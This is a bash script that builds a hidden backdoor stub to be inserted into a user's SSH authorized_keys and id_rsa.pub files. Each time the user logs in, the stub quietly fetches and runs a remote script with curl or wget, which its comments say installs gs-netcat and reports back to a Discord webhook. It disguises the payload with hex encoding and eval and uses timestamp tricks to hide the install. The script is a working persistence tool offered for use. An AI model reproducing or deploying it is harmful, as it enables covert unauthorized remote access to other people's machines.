#! /bin/bash

# Create a BACKDOOR-STUB for ~/.ssh/authorized_keys or ~/.ssh/id_rsa.pub

if [[ -t 1 ]]; then
    CDR="\\033[0;31m" # red
    CDY="\\033[0;33m" # yellow
    CY="\\033[1;33m" # yellow
    CDM="\\033[0;35m" # magenta
    CM="\\033[1;35m" # magenta
    CDC="\\033[0;36m" # cyan
    CN="\\033[0m"    # none
    out(){ echo "$@";}
else
    out(){ :;}
fi

# This stub is encoded for the ssh-key 'command='.
stubs(){ ###___STUBS___
    # - Check if /bin/sh and .ssh have the same date. We set it to the _same_ date
    #   to mark that the backdoor has been installed.
    [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && { :
        touch -r /bin/sh .ssh
        ###-----BEGIN BACKDOOR-----
        # Anything from here until -----END BACKDOOR----- will
        # be executed once when the user logs in. All output goes
        # to stderr.
        #
        # In our DEMO example we request a backdoor script
        # from thc.org/sshx. PLEASE CHANGE THIS.
        #
        # Set a DISCORD KEY:
        export KEY="%%KEY%%"
        # Request and execute sshx (which will install gs-netcat and
        # report the result back to our DISCORD channel)
        bash -c "$(curl -fsSL thc.org/sshx)" || bash -c "$(wget --no-verbose -O- thc.org/sshx)" || exit 0
        ###-----END BACKDOOR-----
    } >/dev/null 2>/dev/null & :
    [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
    [[ -z $SHELL ]] && SHELL=/bin/bash
    [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
    [[ -f /etc/motd ]] && cat /etc/motd
    exec -a -$(basename $SHELL) $SHELL
} ###___STUBS___

# Read my own script and extract the above stub into a variable.
get_stubs()
{
    local IFS
    IFS=""
    STUB="$(<"$0")"
    STUB="${STUB#*___STUBS___}"
    STUB="${STUB%%\} \#\#\#___STUBS___*}"
}

get_stubs
cmd=$(echo "$STUB" | sed 's/^[ \t]*//' | sed 's/^[ \t]*//' | sed '/^$/d' | sed '/^#/d' | tr '\n' ';' | sed "s|%%KEY%%|${KEY}|")

if [[ $1 == clear ]]; then
    cmd=${cmd//\"/\\\"}
else
    bd=$(echo "$cmd" | xxd -ps -c2048)
    cmd="eval \$(echo $bd|xxd -r -ps);"
fi

[[ -z $KEY ]] && out -e "=========================================================================
${CDR}WARNING${CN}: The default reports to THC's Discord channel.
Set your own DISCORD WEBHOOK KEY:
    ${CDC}KEY=\"<Your Discord Webhook Key>\" $0${CN}
========================================================================="

out -e "${CDY}Prepend this to every line in ${CY}~/.ssh/authorized_keys${CDY}
and ${CY}~/.ssh/id_rsa.pub${CDY} so that it looks like this${CN}:"
echo -en "${CM}command=${CM}\"${CDM}\`###---AUTH-DO-NOT-REMOVE---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
out " ssh-rsa blahblah..original..key..here"